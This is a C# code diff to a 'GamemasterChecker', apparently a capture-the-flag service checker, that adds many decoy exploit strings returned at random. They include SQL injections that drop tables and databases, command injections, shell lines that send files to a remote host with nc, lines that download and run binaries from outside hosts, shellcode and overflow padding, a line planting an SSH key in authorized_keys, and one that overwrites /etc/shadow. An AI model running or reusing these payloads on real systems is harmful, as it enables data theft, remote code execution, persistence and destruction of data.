@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using System.Text.Json;
 using System.Security.Cryptography;
 using Microsoft.Extensions.FileProviders.Physical;
+using System.Threading;
 
 namespace GamemasterChecker
 {
@@ -13,12 +14,26 @@ namespace GamemasterChecker
     {
         private static readonly string[] exploits = new string[]
         {
+            "\" OR true",
+            "\"; cat data.db;",
+            "\"; ls | grep -re 🏳️‍🌈\X{4}",
             "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05",
-            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0\0\0\0\x40\x13\x91\0\0\0\0\0\x40\x04\x77\0\0\0\0\0\x40\x03\x91\0\0\x7f\xf7\x55\xed\x74"
+            "\" OR 1=1; DROP Table \"Users\"; --",
+            "\" OR 2 != 0; DROP DATABASE \"Default\"; --",
+            "\" OR 'abc' LIKE % ; SELECT * FROM 'Users' WHERE 1; --",
+            "\"; psql default -U docker \\l",
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0\0\0\0\0\x40\x13\x91\0\0\0\0\0\x40\x04\x77\0\0\0\0\0\x40\x03\x91\0\0\x7f\xf7\x55\xed\x74",
+            "\"; while [ 1 ]; do (find . -maxdepth 1 | xargs cat ) | nc 10.0.0.2 1337; sleep 60; done",
+            "\"; curl https://165.22.31.44:54354/aaa > test_123123; chmod +x test_123123; ./test_123123",
+            "nc 10.0.0.68 890 > a.out; chmod +x a.out;",
+            "curl 10.0.0.193/expl.py > expl-gamemaster.py; python expl-gamemaster.py | nc 10.0.0.193 8888;",
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFwawwfqPSWWfe1TOcvJZkJ73NTzcsBbSqVSl7Y10kOf ed25519-key-20200717\" >> ~/.ssh/authorized_keys",
+            "sfdjveirotagvkeavlökeogetpgj4wefwwrvgagrtegtae\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0 chmod 0777 /etc/shadow;cat a:$1$fnfffc$pGteyHfdsmdsdsffXX4#5:13243:0:99999:7::: > /etc/shadow;",
+            "python -c \" \n while True: ",
         };
         public static string get_Exploit ()
         {
-            return exploits[1];
+            return exploits[ThreadSafeRandom.Next(exploits.Length)];
         }
         public static string GetFakeSession()
         {
@@ -64,6 +79,45 @@ namespace GamemasterChecker
             user.Password = System.Convert.ToBase64String(pw);
             Console.WriteLine(JsonSerializer.Serialize(user));
             return user;
+        }
+    }
+    ///
+    /// code used from https://devblogs.microsoft.com/pfxteam/getting-random-numbers-in-a-thread-safe-way/
+    public static class ThreadSafeRandom
+    {
+        private static readonly RNGCryptoServiceProvider _global = new RNGCryptoServiceProvider();
+        [ThreadStatic]
+        private static Random? _local;
+
+        public static void NextBytes(byte[] array)
+        {
+            Random? inst = _local;
+            if (inst == null)
+            {
+                byte[] buffer = new byte[4];
+                _global.GetBytes(buffer);
+                _local = inst = new Random(
+                    BitConverter.ToInt32(buffer, 0));
+            }
+            inst.NextBytes(array);
+        }
+
+        public static int Next()
+        {
+            Random? inst = _local;
+            if (inst == null)
+            {
+                byte[] buffer = new byte[4];
+                _global.GetBytes(buffer);
+                _local = inst = new Random(
+                    BitConverter.ToInt32(buffer, 0));
+            }
+            return inst.Next();
+        }
+
+        public static int Next(int n)
+        {
+            return Next() % n;
         }
     }
 }
